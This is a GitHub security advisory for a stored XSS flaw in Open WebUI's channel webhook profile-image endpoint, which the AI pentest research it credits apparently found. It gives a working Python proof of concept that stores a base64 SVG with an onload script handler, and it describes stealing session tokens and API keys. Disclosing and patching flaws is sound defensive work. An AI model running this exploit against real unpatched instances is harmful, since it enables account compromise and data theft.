# [H] Open WebUI has XSS via SVG in /api/v1/channels/webhooks/{webhook_id}/profile/image

## Summary
Severity: High
Advisory: GHSA-3856-3vxq-m6fc
CVE: CVE-2026-45314
CWE: CWE-87
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-3856-3vxq-m6fc
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.3

## Details
As part of our research on improving our [AI pentest](https://www.aikido.dev/attack/aipentest), we have uncovered the following issue in Open WebUI. We've manually verified and tided up the report, but you can also find the original agent finding at the bottom of this report.

### Summary

The channel webhook create/update flow accepts arbitrary `profile_image_url` values, including `data:image/svg+xml;base64,...` payloads. The profile image endpoint then decodes and serves this SVG as `image/svg+xml` without sanitization, allowing attacker-controlled script handlers (for example onload) to execute when the profile-image URL is opened in the browser.

### Details

The server accepts `data:image/svg+xml;base64,...` values for `profile_image_url` when creating or updating a webhook. Later, `GET /api/v1/channels/webhooks/{webhook_id}/profile/image` detects `data:image`, base64-decodes it, derives the media type from the header (e.g., `image/svg+xml`), and returns a `StreamingResponse` with `Content-Disposition: inline` and `media_type` set to `image/svg+xml`. There is no sanitization or transformation. When this URL is opened in a browser, SVG event handlers such as onload execute in the application origin, resulting in stored XSS.

### PoC

1. Set up a new instance of Open WebUI and log in as admin
2. In the Admin Panel, enable *Channels (Beta)* and click Save
3. Create a low-privilege user in the Users tab
4. As the attacker, use the low-privilege user to run the following script:

```py
import base64
import secrets

import requests

BASE_URL = "http://127.0.0.1:14000"
EMAIL = "low@local.test"
PASSWORD = "low"

CHANNEL_NAME_PREFIX = "xsswh-poc"
WEBHOOK_NAME = "xss-webhook-poc"
SVG_CANARY = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(origin)"></svg>'

if __name__ == "__main__":
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json"})

    r = s.post(
        f"{BASE_URL}/api/v1/auths/signin",
        json={"email": EMAIL, "password": PASSWORD},
        timeout=30,
    )
    r.raise_for_status()
    s.headers["Authorization"] = f"Bearer {r.json()['token']}"

    r = s.post(
        f"{BASE_URL}/api/v1/channels/create",
        json={
            "name": f"{CHANNEL_NAME_PREFIX}-{secrets.token_hex(4)}",
            "type": "group",
            "user_ids": [],
            "group_ids": [],
        },
        timeout=30,
    )
    r.raise_for_status()
    channel_id = r.json()["id"]

    payload = "data:image/svg+xml;base64," + base64.b64encode(SVG_CANARY.encode()).decode()
    r = s.post(
        f"{BASE_URL}/api/v1/channels/{channel_id}/webhooks/create",
        json={"name": WEBHOOK_NAME, "profile_image_url": payload},
        timeout=30,
    )
    r.raise_for_status()
    webhook_id = r.json()["id"]

    print(f"{BASE_URL}/api/v1/channels/webhooks/{webhook_id}/profile/image")
```

This should print a URL like the following, which when visited (by any user), triggers a JavaScript popup proving XSS:

http://127.0.0.1:14000/api/v1/channels/webhooks/aa7c925f-4584-4274-82bf-33a7e98a3365/profile/image

<img width="1079" height="222" alt="image" src="https://github.com/user-attachments/assets/ce158ace-d14f-4a73-aeb0-e828aff005df" />

### Impact

Conditions required: The victim must be an authenticated, verified user. Channel feature must be enabled.

Stored XSS enables arbitrary JavaScript execution in the context of the application's origin for any viewer who loads the malicious profile image URL. An attacker can exfiltrate session tokens (localstorage) or API keys stored in the page context, perform unauthorized actions on behalf of the victim via same-origin APIs, alter settings, or pivot to broader account compromise. Because this vector is persisted in the database as part of a webhook's profile image, it remains active until removed.

### Original Agent Report

<img width="400" alt="app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20439766 (5)" src="https://github.com/user-attachments/assets/0bfb2c7c-f7c4-49cd-a262-5ed9e1bb10df" />

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-3856-3vxq-m6fc
- https://nvd.nist.gov/vuln/detail/CVE-2026-45314
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.3
